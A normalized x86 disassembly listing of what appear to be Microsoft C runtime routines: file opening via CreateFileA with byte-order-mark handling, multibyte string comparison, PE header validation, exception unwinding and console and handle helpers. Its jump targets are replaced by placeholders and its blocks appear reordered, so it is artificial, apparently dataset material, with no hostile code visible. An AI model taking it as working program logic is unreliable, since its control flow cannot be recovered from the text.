mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100077ee
int3
mov eax 0x8000
test [ ebp + 0x10 ] eax
jne r-xdata
lea eax [ ebp - 0x24 ]
push eax
call sub_1000fa81
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp + 0x10 ]
and eax 0x3
sub eax ebx
mov ecx 0xc0000000
mov edx 0x80000000
je r-xdata
test [ ebp + 0x10 ] 0x74000
jne r-xdata
mov [ ebp - 0xc ] edx
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x24 ] eax
je r-xdata
mov [ ebp - 0x14 ] ebx
sub eax ecx
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
sub eax ecx
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
test [ ebp + 0x10 ] 0x70000
jne r-xdata
mov [ ebp - 0xc ] ecx
jmp r-xdata
call sub_100078a5
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_10007892
push 0x16
pop esi
mov [ eax ] esi
call sub_10007840
mov eax esi
jmp r-xdata
mov [ ebp - 0x18 ] 0x1
cmp eax 0x600
je r-xdata
mov [ ebp - 0x18 ] 0x3
jmp r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x10 ]
mov edx 0x700
and eax edx
mov ecx 0x400
push edi
mov edi 0x100
cmp eax ecx
jg r-xdata
mov [ ebp - 0x14 ] 0x2
jmp r-xdata
sub eax ecx
je r-xdata
mov eax [ ebp + 0x14 ]
push 0x10
pop ecx
sub eax ecx
je r-xdata
pop esi
pop ebx
leave
retn
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x18 ]
test cl cl
js r-xdata
mov [ ebp - 0x18 ] 0x5
jmp r-xdata
cmp eax edx
je r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x80
test edi eax
je r-xdata
cmp eax edi
je r-xdata
mov [ ebp - 0x14 ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
test eax 0x1000
je r-xdata
or [ ebp - 0x10 ] 0x4000000
or [ ebp - 0xc ] 0x10000
or [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] 0x1
call sub_100078a5
mov [ eax ] ebx
or [ esi ] 0xffffffff
call sub_10007892
push 0x16
pop esi
mov [ eax ] esi
call sub_10007840
mov eax esi
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp [ ebp - 0xc ] edx
sete al
mov [ ebp - 0x14 ] eax
jmp r-xdata
test al 0x20
je r-xdata
or [ ebp - 0x10 ] edi
cmp eax 0x300
jne r-xdata
test al 0x10
je r-xdata
or [ ebp - 0x10 ] 0x8000000
jmp r-xdata
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
call sub_1000daff
or ebx 0xffffffff
mov [ esi ] eax
cmp eax ebx
jne r-xdata
or [ ebp - 0x10 ] __dos_header
mov eax [ ebp + 0x8 ]
mov edi [ CreateFileA@IAT ]
push 0x0
push [ ebp - 0x10 ]
mov [ eax ] 0x1
push [ ebp - 0x18 ]
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
call sub_100078a5
and [ eax ] 0x0
mov [ esi ] ebx
call sub_10007892
mov [ eax ] 0x18
call sub_10007892
mov eax [ eax ]
jmp r-xdata
push [ ebp - 0x20 ]
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
pop edi
cmp eax 0x2
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_100078b8
pop ecx
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov esi [ esi ]
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_100078b8
test [ ebp + 0x10 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_10007892
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_10007892
mov [ eax ] 0xd
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
and [ ebp - 0xc ] 0x7fffffff
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
push [ ebp - 0x18 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
call edi
mov [ ebp - 0x20 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x20 ]
push [ esi ]
call sub_1000d8c9
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
pop ecx
shl eax 0x6
pop ecx
mov cl [ ebp - 0x1 ]
or cl 0x1
mov [ edx + eax + 0x4 ] cl
mov eax [ esi ]
mov edx eax
and eax 0x1f
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
shl eax 0x6
lea eax [ edx + eax + 0x24 ]
and [ eax ] 0x80
mov [ ebp - 0x3 ] cl
and [ ebp - 0x3 ] 0x48
mov [ ebp - 0x1 ] cl
jne r-xdata
or [ ebp - 0x1 ] 0x8
test [ ebp - 0x1 ] 0x80
je r-xdata
test cl 0x80
je r-xdata
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov cl [ eax ]
xor cl [ ebp - 0x2 ]
and cl 0x7f
xor [ eax ] cl
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
shl eax 0x6
lea eax [ ecx + eax + 0x24 ]
mov ecx [ ebp + 0x10 ]
mov dl [ eax ]
shr ecx 0x10
shl cl 0x7
and dl 0x7f
or cl dl
cmp [ ebp - 0x3 ] 0x0
mov [ eax ] cl
jne r-xdata
mov edi 0x74000
mov ecx 0x4000
test [ ebp + 0x10 ] edi
jne r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
mov ecx [ ebp - 0xc ]
mov eax 0xc0000000
and ecx eax
cmp ecx eax
jne r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
mov eax [ ebp + 0x10 ]
and eax edi
cmp eax ecx
je r-xdata
mov eax [ ebp - 0x24 ]
and eax edi
jne r-xdata
push 0x2
push ebx
push [ esi ]
call sub_1000f951
mov edi eax
add esp 0xc
cmp edi ebx
jne r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
or [ eax ] 0x20
mov [ ebp - 0x2 ] 0x0
cmp eax 0x10000
je r-xdata
or [ ebp + 0x10 ] eax
or [ ebp + 0x10 ] ecx
jmp r-xdata
push 0x1
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
mov [ ebp - 0x4 ] 0x0
call sub_1000f39a
add esp 0xc
test eax eax
jne r-xdata
call sub_100078a5
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x20 ]
call [ CloseHandle@IAT ]
push 0x0
push [ ebp - 0x10 ]
lea eax [ ebp - 0x30 ]
push 0x3
push eax
push [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
and eax 0x7fffffff
push eax
push [ ebp + 0xc ]
call [ CreateFileA@IAT ]
cmp eax ebx
jne r-xdata
xor edi edi
test [ ebp - 0x1 ] 0x40
mov [ ebp - 0x1c ] edi
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov eax 0x301
and ecx eax
cmp ecx eax
jne r-xdata
cmp eax 0x14000
je r-xdata
push 0x0
push 0x0
push [ esi ]
call sub_1000f951
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x1a
jne r-xdata
push [ esi ]
call sub_1000a43e
jmp r-xdata
mov esi [ esi ]
mov ecx esi
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
mov [ esi + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_100078b8
mov eax [ esi ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
push [ esi ]
call sub_1000d94a
pop ecx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test [ ebp + 0x10 ] 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
mov eax edi
cdq
push edx
push eax
push [ esi ]
call sub_1000f1e4
add esp 0xc
cmp eax ebx
je r-xdata
pop ecx
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
cmp eax 0x2
jbe r-xdata
push 0x3
lea eax [ ebp - 0x1c ]
push eax
push [ esi ]
call sub_1000f39a
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
xor edi edi
dec eax
je r-xdata
cmp eax 0x4
ja r-xdata
cmp eax 0x2
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax edi
jbe r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
mov [ ebp - 0x1c ] 0xbfbbef
push 0x3
dec eax
jne r-xdata
cmp eax 0x5
jne r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_1000b730
add esp 0x10
or eax edx
je r-xdata
mov eax [ ebp - 0x1c ]
and eax 0xffff
cmp eax 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jbe r-xdata
add edi eax
cmp ebx edi
jg r-xdata
mov [ ebp - 0x1c ] 0xfeff
push 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_1000b730
add esp 0x10
and eax edx
cmp eax 0xfeff
jne r-xdata
push [ esi ]
call sub_1000a43e
pop ecx
call sub_10007892
push 0x16
pop esi
mov [ eax ] esi
mov [ ebp - 0x8 ] esi
jmp r-xdata
push edi
push edi
push [ esi ]
call sub_1000f951
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x1c ] 0xbfbbef
jne r-xdata
cmp eax 0x4
jbe r-xdata
mov eax ebx
sub eax edi
push eax
lea eax [ ebp + edi - 0x1c ]
push eax
push [ esi ]
call sub_1000a141
add esp 0xc
cmp eax 0xffffffff
je r-xdata
or ebx 0xffffffff
pop ebx
jmp r-xdata
push edi
push 0x2
push [ esi ]
call sub_1000f951
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push 0x2
push edi
push edi
push [ esi ]
call sub_1000b730
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push edi
push edi
push edi
push [ esi ]
call sub_1000b730
and eax edx
add esp 0x10
cmp eax ebx
je r-xdata
sub_1000d066
push 0x14
push r--data
call sub_10009700
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x18 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] edi
setne al
cmp eax edi
je r-xdata
call sub_10007892
push 0x16
pop esi
mov [ eax ] esi
call sub_10007840
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
call sub_10009745
retn
mov [ ebp - 0x4 ] edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax esi
call sub_1000c932
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1000d0fc
mov eax [ ebp - 0x20 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ esi ] 0xffffffff
sub_1000d0fc
cmp [ ebp - 0x1c ] edi
je r-xdata
retn
cmp [ ebp - 0x20 ] edi
je r-xdata
push [ esi ]
call sub_1000dad8
pop ecx
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_1000d12a
mov edi edi
push ebp
mov ebp esp
push 0x1
push [ ebp + 0x8 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1000d066
add esp 0x18
pop ebp
retn
sub_1000d14a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x18 ]
call sub_100056cc
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000f191
add esp 0xc
cmp [ ebp - 0xc ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
push edi
mov edi [ ebp + 0xc ]
cmp edi ebx
jne r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
cmp [ ebp - 0xc ] bl
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
push esi
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
cmp [ ebp - 0xc ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx edx
movzx ecx [ ecx + 0x11d ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov dl [ edx ]
cmp dl bl
jne r-xdata
movzx ecx [ edi ]
test [ ecx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
movzx edx [ ebp - 0x4 ]
lea ecx [ edx + eax ]
test [ ecx + 0x1d ] 0x10
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov [ ebp - 0x8 ] ecx
shl ecx 0x8
movzx edx dl
or cx dx
inc [ ebp + 0x8 ]
movzx ecx cx
mov si cx
mov [ ebp - 0x8 ] ecx
cmp si [ eax + 0x10 ]
jb r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0xc ] bl
je r-xdata
mov si bx
jmp r-xdata
mov ecx edx
movzx ecx [ ecx + 0x11d ]
jmp r-xdata
mov dl [ edi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp si [ eax + 0x16 ]
jb r-xdata
cmp si [ eax + 0x12 ]
ja r-xdata
mov si [ ebp - 0x8 ]
xor eax eax
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov [ ebp - 0x4 ] ecx
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0xc ] bl
je r-xdata
cmp si bx
je r-xdata
shl ecx 0x8
movzx edx dl
or cx dx
movzx ecx cx
inc edi
mov [ ebp - 0x4 ] ecx
cmp cx [ eax + 0x10 ]
jb r-xdata
mov cx [ ebp - 0x4 ]
movzx ecx [ edi ]
movzx edx cl
inc edi
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x4 ] ecx
je r-xdata
cmp si [ eax + 0x18 ]
ja r-xdata
add si [ eax + 0x14 ]
jmp r-xdata
pop esi
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp cx [ eax + 0x16 ]
jb r-xdata
cmp cx [ eax + 0x12 ]
ja r-xdata
add si [ eax + 0x1a ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
movzx ecx [ ecx ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx edx cl
test [ edx + eax + 0x1d ] 0x4
mov [ ebp - 0x8 ] ecx
je r-xdata
cmp cx si
jne r-xdata
cmp cx [ eax + 0x18 ]
ja r-xdata
add cx [ eax + 0x14 ]
jmp r-xdata
add cx [ eax + 0x1a ]
jmp r-xdata
sub_1000d368
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
leave
retn
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1000c756
add esp 0xc
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
movzx ecx [ ebx ]
dec [ ebp + 0x10 ]
movzx eax cl
inc ebx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_10007892
mov [ eax ] 0x16
call sub_10007840
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ esi ]
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov al [ ebx ]
test al al
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test cx cx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx eax al
or cx ax
movzx ecx cx
inc ebx
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
shl eax 0x8
movzx edx dl
or ax dx
movzx eax ax
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_1000d4d0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_1000d510
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1000d560
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10009760
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_1000d4d0
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_1000d510
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000d620
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1000d640
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_10008edb
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_1000d685
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_1000d685
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_1000d640
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1000d735
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_1000d754
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_1000d735
push ebx
push ecx
mov ebx rw-data
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_1000d757
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_1000faae
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
je r-xdata
mov eax 0xffff
leave
retn
mov ax [ ebp + 0x8 ]
leave
retn
sub_1000d799
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_100056cc
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_1000bae9
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_10007892
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_1000d8c9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
js r-xdata
call sub_10007892
mov [ eax ] 0x9
call sub_100078a5
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1000d94a
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
jl r-xdata
call sub_10007892
mov [ eax ] 0x9
call sub_100078a5
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x1
je r-xdata
cmp [ eax + esi ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_1000d9d0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
test eax eax
js r-xdata
call sub_100078a5
and [ eax ] 0x0
call sub_10007892
mov [ eax ] 0x9
call sub_100078a5
and [ eax ] 0x0
call sub_10007892
mov [ eax ] 0x9
call sub_10007840
